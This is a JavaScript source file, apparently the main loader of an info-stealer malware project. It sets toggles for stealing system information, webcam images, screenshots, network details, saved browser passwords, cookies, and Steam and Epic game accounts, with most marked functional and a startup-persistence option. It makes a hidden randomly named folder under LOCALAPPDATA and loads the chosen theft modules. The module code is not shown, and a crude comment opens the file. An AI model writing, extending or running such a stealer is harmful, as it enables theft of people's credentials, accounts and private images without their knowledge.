// suck my nuts, heres all the toggles
// try to keep these in order
  // system info
  let runOnStartupToggle = false; //TODO (might move to a preloader)
  let sysInfoToggle = false; //FUNCTIONAL
  let webcamToggle = false; //FUNCTIONAL
  let screenshotToggle = false; //FUNCTIONAL
  let networkToggle = false; //FUNCTIONAL
    // browser info
  let browserPassToggle = false; //FUNCTIONAL
  let browserCookieToggle = false; //TODO
    // game info
  let steamToggle = false; //FUNCTIONAL
  let epicToggle = false; //FUNCTIONAL
  
  // mutex generation for directory creation
  const fs = require('fs').promises;
  const path = require('path');
  const crypto = require('crypto');
  
  const randomKey = crypto.randomBytes(10).toString('hex');
  const localAppData = process.env.LOCALAPPDATA;
  const DirectoryPath = path.join(localAppData, randomKey);
  module.exports = { DirectoryPath };
  
  console.log(`${DirectoryPath} has been created.`)
  
  fs.mkdir(DirectoryPath, { recursive: true })
      .then(() => {
  
          if (runOnStartupToggle){
            require('./modules/startup.js')
          }
          if (sysInfoToggle){
            require('./modules/systeminfo.js')
          }
          if (webcamToggle){
            require('./modules/webcam.js')
          }
          if (screenshotToggle){
            require('./modules/screenshots.js')
          }
          if (networkToggle){
            require('./modules/networkinfo.js')
          }
          if (browserPassToggle){
            require('./modules/browserpass.js')
          }
          if (browserCookieToggle){
            require('./modules/browsercookie.js')
          }
          if (steamToggle){
            require('./modules/steam.js')
          }
          if (epicToggle){
            require('./modules/epic.js')
          }
      })
      .catch((err) => {
        console.log(err);
      });